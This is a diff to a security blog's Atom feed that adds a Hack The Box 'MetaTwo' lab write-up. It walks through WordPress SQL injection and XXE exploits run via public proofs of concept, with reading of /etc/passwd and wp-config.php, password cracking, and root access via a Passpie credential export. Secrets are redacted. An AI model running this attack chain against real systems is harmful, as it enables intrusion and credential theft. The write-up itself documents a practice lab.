@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-10-24T16:01:58+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">blackhawk0x</title><subtitle>Writeups, malware analysis, and reverse engineering notes by blackhawk0x.</subtitle><author><name>blackhawk0x</name></author><entry><title type="html">Hack The Box: Access</title><link href="http://localhost:4000/posts/access/" rel="alternate" type="text/html" title="Hack The Box: Access" /><published>2026-10-24T00:00:00+05:30</published><updated>2026-10-24T00:00:00+05:30</updated><id>http://localhost:4000/posts/access</id><content type="html" xml:base="http://localhost:4000/posts/access/"><![CDATA[<h1 id="htb-access">HTB Access</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-10-24T18:32:00+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">blackhawk0x</title><subtitle>Writeups, malware analysis, and reverse engineering notes by blackhawk0x.</subtitle><author><name>blackhawk0x</name></author><entry><title type="html">Hack The Box: Access</title><link href="http://localhost:4000/posts/access/" rel="alternate" type="text/html" title="Hack The Box: Access" /><published>2026-10-24T00:00:00+05:30</published><updated>2026-10-24T00:00:00+05:30</updated><id>http://localhost:4000/posts/access</id><content type="html" xml:base="http://localhost:4000/posts/access/"><![CDATA[<h1 id="htb-access">HTB Access</h1>
 
 <h2 id="1-initial-enumeration">1. Initial Enumeration</h2>
 
@@ -254,7 +254,405 @@ Reuse saved credentials with runas /savecred
       |
       v
 Read Administrator's root.txt
-</code></pre></div></div>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="windows" /><category term="telnet" /><category term="MDB" /><category term="PST" /><category term="Saved-Credentials" /><summary type="html"><![CDATA[HTB Access]]></summary></entry><entry><title type="html">Hack The Box: Delivery</title><link href="http://localhost:4000/posts/delivery/" rel="alternate" type="text/html" title="Hack The Box: Delivery" /><published>2026-10-23T00:00:00+05:30</published><updated>2026-10-23T00:00:00+05:30</updated><id>http://localhost:4000/posts/delivery</id><content type="html" xml:base="http://localhost:4000/posts/delivery/"><![CDATA[<h1 id="htb-delivery">HTB Delivery</h1>
+</code></pre></div></div>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="windows" /><category term="telnet" /><category term="MDB" /><category term="PST" /><category term="Saved-Credentials" /><summary type="html"><![CDATA[HTB Access]]></summary></entry><entry><title type="html">Hack The Box: MetaTwo</title><link href="http://localhost:4000/posts/metatwo/" rel="alternate" type="text/html" title="Hack The Box: MetaTwo" /><published>2026-10-24T00:00:00+05:30</published><updated>2026-10-24T00:00:00+05:30</updated><id>http://localhost:4000/posts/metatwo</id><content type="html" xml:base="http://localhost:4000/posts/metatwo/"><![CDATA[<h1 id="htb-metatwo">HTB MetaTwo</h1>
+
+<h2 id="1-initial-enumeration">1. Initial Enumeration</h2>
+
+<p><strong>Target:</strong> <code class="language-plaintext highlighter-rouge">10.129.228.95</code></p>
+
+<p>The initial Nmap scan identified three open ports:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -p21,22,80 10.129.228.95 --min-rate 1000 -oN nmap.txt
+</code></pre></div></div>
+
+<h3 id="results">Results</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Port</th>
+      <th>Service</th>
+      <th>Finding</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>21</td>
+      <td>FTP</td>
+      <td>FTP service; further enumeration required</td>
+    </tr>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 8.4p1 on Debian</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>Nginx 1.18.0; redirects to <code class="language-plaintext highlighter-rouge">metapress.htb</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The website was hosted on the <code class="language-plaintext highlighter-rouge">metapress.htb</code> virtual host. I added the hostname to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> so the site could be accessed by name.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.129.228.95 metapress.htb
+</code></pre></div></div>
+
+<p>Opening the website revealed a WordPress installation. The next step was to identify the WordPress version and installed plugins.</p>
+
+<h2 id="2-wordpress-and-plugin-enumeration">2. WordPress and Plugin Enumeration</h2>
+
+<p>The WordPress version was identified by inspecting the page source:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -s http://metapress.htb | grep -i 'ver'
+</code></pre></div></div>
+
+<p>The response revealed <strong>WordPress 5.6.2</strong>.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">/events/</code> page exposed the BookingPress plugin and its version through the stylesheet URLs:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -s http://metapress.htb/events/ | grep -i plugins
+</code></pre></div></div>
+
+<p>Relevant result:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bookingpress-appointment-booking/...css?ver=1.0.10
+</code></pre></div></div>
+
+<p>The identified components were:</p>
+
+<ul>
+  <li>
+    <p><strong>WordPress 5.6.2:</strong> vulnerable to authenticated XXE under the conditions described by CVE-2021-29447.</p>
+  </li>
+  <li>
+    <p><strong>BookingPress 1.0.10:</strong> associated with the SQL injection vulnerability CVE-2022-0739.</p>
+  </li>
+</ul>
+
+<p>These findings provided two potential avenues for further investigation.</p>
+
+<h2 id="3-bookingpress-sql-injection--credential-discovery">3. BookingPress SQL Injection — Credential Discovery</h2>
+
+<p>I searched for a proof of concept for CVE-2022-0739 and found:</p>
+
+<p><a href="https://github.com/viardant/CVE-2022-0739/blob/main/README.md">BookingPress CVE-2022-0739 PoC — GitHub</a></p>
+
+<p>The exploit was executed against the vulnerable site:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py \
+  -u http://metapress.htb \
+  -nu http://metapress.htb/events/ \
+  -a -o db_dump -payload
+</code></pre></div></div>
+
+<p>The exploit fingerprinted the database as MariaDB and retrieved WordPress user records.</p>
+
+<p>The recovered accounts included:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">admin</code></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">manager</code></p>
+  </li>
+</ul>
+
+<p>The output contained their email addresses and password hashes. Those sensitive values have been redacted.</p>
+
+<h3 id="cracking-the-managers-password-hash">Cracking the manager’s password hash</h3>
+
+<p>The recovered manager hash was saved to <code class="language-plaintext highlighter-rouge">hash.txt</code> and tested with Hashcat:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p>Hashcat identified the hash format as <strong>phpass (mode 400)</strong> and successfully recovered the manager’s password.</p>
+
+<p><strong>Recovered password:</strong> <code class="language-plaintext highlighter-rouge">[REDACTED]</code></p>
+
+<h2 id="4-authenticated-xxe-in-wordpress">4. Authenticated XXE in WordPress</h2>
+
+<p>With the recovered manager credentials, I investigated CVE-2021-29447, an authenticated XXE vulnerability affecting WordPress audio-file handling under specific conditions.</p>
+
+<p>PoC used:</p>
+
+<p><a href="https://github.com/Val-Resh/CVE-2021-29447-POC/blob/main/CVE-2021-29447.py">WordPress CVE-2021-29447 PoC — GitHub</a></p>
+
+<p>The exploit was run against the target:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo python3 poc2.py \
+  --url http://metapress.htb \
+  --server-ip 10.10.15.25 \
+  -u manager \
+  -p '[REDACTED]'
+</code></pre></div></div>
+
+<p>The PoC successfully authenticated, retrieved the upload nonce, generated a WAV payload containing an XXE, and started a listener for the external DTD.</p>
+
+<h3 id="reading-etcpasswd">Reading <code class="language-plaintext highlighter-rouge">/etc/passwd</code></h3>
+
+<p>The first file requested through the XXE was:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/passwd
+</code></pre></div></div>
+
+<p>The exploit returned the file contents, revealing local system accounts, including:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jnelson:x:1000:1000:...:/home/jnelson:/bin/bash
+www-data:x:33:33:...:/var/www:/usr/sbin/nologin
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">jnelson</code> account was particularly interesting because it had a home directory and a Bash login shell.</p>
+
+<h3 id="reading-wp-configphp">Reading <code class="language-plaintext highlighter-rouge">wp-config.php</code></h3>
+
+<p>The next request targeted the WordPress configuration file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>../wp-config.php
+</code></pre></div></div>
+
+<p>The XXE succeeded again and exposed configuration details, including:</p>
+
+<ul>
+  <li>
+    <p>WordPress database name and username</p>
+  </li>
+  <li>
+    <p>Database password — <code class="language-plaintext highlighter-rouge">[REDACTED]</code></p>
+  </li>
+  <li>
+    <p>FTP username — <code class="language-plaintext highlighter-rouge">[REDACTED]</code></p>
+  </li>
+  <li>
+    <p>FTP password — <code class="language-plaintext highlighter-rouge">[REDACTED]</code></p>
+  </li>
+  <li>
+    <p>FTP hostname and base directory</p>
+  </li>
+</ul>
+
+<p>This was a significant breakthrough. The configuration file exposed credentials for services beyond the WordPress application.</p>
+
+<h2 id="5-ftp-enumeration-with-recovered-credentials">5. FTP Enumeration with Recovered Credentials</h2>
+
+<p>The initial scan identified FTP on port 21, but anonymous access was unavailable. The credentials recovered from <code class="language-plaintext highlighter-rouge">wp-config.php</code> provided a way to authenticate.</p>
+
+<p>Connected to the service:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.129.228.95
+</code></pre></div></div>
+
+<p>After authenticating with the recovered FTP account, I enumerated the accessible directories.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blog/
+mailer/
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">mailer</code> directory contained:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PHPMailer/
+send_email.php
+</code></pre></div></div>
+
+<p>I downloaded the PHP script for offline inspection:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get send_email.php
+</code></pre></div></div>
+
+<h3 id="inspecting-send_emailphp">Inspecting <code class="language-plaintext highlighter-rouge">send_email.php</code></h3>
+
+<p>The script contained PHPMailer configuration for an SMTP account:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$mail-&gt;Host = "mail.metapress.htb";
+$mail-&gt;SMTPAuth = true;
+$mail-&gt;Username = "[REDACTED]";
+$mail-&gt;Password = "[REDACTED]";
+$mail-&gt;SMTPSecure = "tls";
+$mail-&gt;Port = 587;
+</code></pre></div></div>
+
+<p>The configuration identified the account as belonging to <code class="language-plaintext highlighter-rouge">jnelson</code>.</p>
+
+<p>This linked the SMTP credentials to the local <code class="language-plaintext highlighter-rouge">jnelson</code> account discovered earlier in <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>
+
+<p>The credentials were therefore worth testing against the exposed SSH service.</p>
+
+<h2 id="6-ssh-access-as-jnelson">6. SSH Access as <code class="language-plaintext highlighter-rouge">jnelson</code></h2>
+
+<p>The target exposed SSH on port 22. I attempted to authenticate as <code class="language-plaintext highlighter-rouge">jnelson</code> using the password recovered from the mailer configuration.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh jnelson@10.129.228.95
+</code></pre></div></div>
+
+<p>Authentication succeeded, establishing an SSH session as <code class="language-plaintext highlighter-rouge">jnelson</code>.</p>
+
+<p>The home directory contained <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls
+cat user.txt
+</code></pre></div></div>
+
+<p><strong>User flag:</strong> <code class="language-plaintext highlighter-rouge">[REDACTED]</code></p>
+
+<h2 id="7-enumerating-stored-passwords-with-passpie">7. Enumerating Stored Passwords with Passpie</h2>
+
+<p>After obtaining the SSH shell, I enumerated the available commands and discovered <code class="language-plaintext highlighter-rouge">passpie</code>.</p>
+
+<p>Running it displayed stored credential entries:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>passpie
+</code></pre></div></div>
+
+<p>The output showed entries for:</p>
+
+<ul>
+  <li>
+    <p>SSH account <code class="language-plaintext highlighter-rouge">jnelson</code></p>
+  </li>
+  <li>
+    <p>SSH account <code class="language-plaintext highlighter-rouge">root</code></p>
+  </li>
+</ul>
+
+<p>The stored passwords were masked in the terminal output.</p>
+
+<p>An attempt to export the credentials initially failed because the passphrase was incorrect:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>passpie export ./creds
+</code></pre></div></div>
+
+<p>The error indicated that the supplied passphrase was not valid.</p>
+
+<h3 id="inspecting-passpies-files">Inspecting Passpie’s files</h3>
+
+<p>I inspected the Passpie directory:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd ~/.passpie
+ls -la
+</code></pre></div></div>
+
+<p>The directory contained:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.config
+.keys
+ssh/
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">.keys</code> file contained the key material used by Passpie. This became the next focus of the investigation.</p>
+
+<h2 id="8-cracking-the-passpie-gpg-passphrase">8. Cracking the Passpie GPG Passphrase</h2>
+
+<p>The private key material in <code class="language-plaintext highlighter-rouge">.keys</code> was used to generate a John the Ripper-compatible hash. The public-key entries were removed from a working copy before processing it.</p>
+
+<p>The hash was generated with:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gpg2john keys &gt; hash.txt
+</code></pre></div></div>
+
+<p>John the Ripper was then run against the extracted hash:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p>John successfully recovered the Passpie passphrase.</p>
+
+<p><strong>Passphrase:</strong> <code class="language-plaintext highlighter-rouge">[REDACTED]</code></p>
+
+<p>This passphrase allowed the stored credentials to be exported.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>passpie export ./cred.txt
+</code></pre></div></div>
+
+<p>The exported credential file contained entries for <code class="language-plaintext highlighter-rouge">jnelson</code> and <code class="language-plaintext highlighter-rouge">root</code>. Both stored password values have been redacted.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>credentials:
+  - fullname: root@ssh
+    login: root
+    password: '[REDACTED]'
+  - fullname: jnelson@ssh
+    login: jnelson
+    password: '[REDACTED]'
+</code></pre></div></div>
+
+<p>The important finding was the stored password associated with the <code class="language-plaintext highlighter-rouge">root</code> SSH account.</p>
+
+<h2 id="9-privilege-escalation-to-root">9. Privilege Escalation to Root</h2>
+
+<p>The Passpie export revealed a password for the root account. Rather than exploiting a kernel vulnerability or a misconfigured SUID binary, I used the recovered credential to switch users.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su root
+</code></pre></div></div>
+
+<p>After entering the recovered root password, the shell changed to the root account.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd ~
+ls
+</code></pre></div></div>
+
+<p>The root directory contained <code class="language-plaintext highlighter-rouge">root.txt</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat root.txt
+</code></pre></div></div>
+
+<p><strong>Root flag:</strong> <code class="language-plaintext highlighter-rouge">[REDACTED]</code></p>
+
+<p>This completed the privilege-escalation chain.</p>
+
+<h2 id="10-attack-chain-summary">10. Attack Chain Summary</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap Enumeration
+       |
+       v
+Discover WordPress and BookingPress
+       |
+       v
+BookingPress SQL Injection (CVE-2022-0739)
+       |
+       v
+Retrieve WordPress User Hashes
+       |
+       v
+Crack Manager Password
+       |
+       v
+Authenticated WordPress XXE (CVE-2021-29447)
+       |
+       v
+Read /etc/passwd and wp-config.php
+       |
+       v
+Recover FTP Credentials
+       |
+       v
+Enumerate FTP and Download send_email.php
+       |
+       v
+Recover SMTP Credentials for jnelson
+       |
+       v
+SSH Login as jnelson
+       |
+       v
+Discover Passpie Credential Store
+       |
+       v
+Extract and Crack GPG Key Hash
+       |
+       v
+Recover Passpie Passphrase
+       |
+       v
+Export Stored Root Credentials
+       |
+       v
+Switch to Root with su
+       |
+       v
+Read root.txt
+</code></pre></div></div>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="linux" /><category term="wordpress" /><category term="SQL-Injection" /><category term="XXE" /><category term="CVE-2022-0739" /><category term="CVE-2021-29447" /><category term="Passpie" /><summary type="html"><![CDATA[HTB MetaTwo]]></summary></entry><entry><title type="html">Hack The Box: Delivery</title><link href="http://localhost:4000/posts/delivery/" rel="alternate" type="text/html" title="Hack The Box: Delivery" /><published>2026-10-23T00:00:00+05:30</published><updated>2026-10-23T00:00:00+05:30</updated><id>http://localhost:4000/posts/delivery</id><content type="html" xml:base="http://localhost:4000/posts/delivery/"><![CDATA[<h1 id="htb-delivery">HTB Delivery</h1>
 
 <p><strong>Target:</strong> <code class="language-plaintext highlighter-rouge">10.129.8.154</code><br />
 <strong>Operating System:</strong> Linux (Debian)<br />
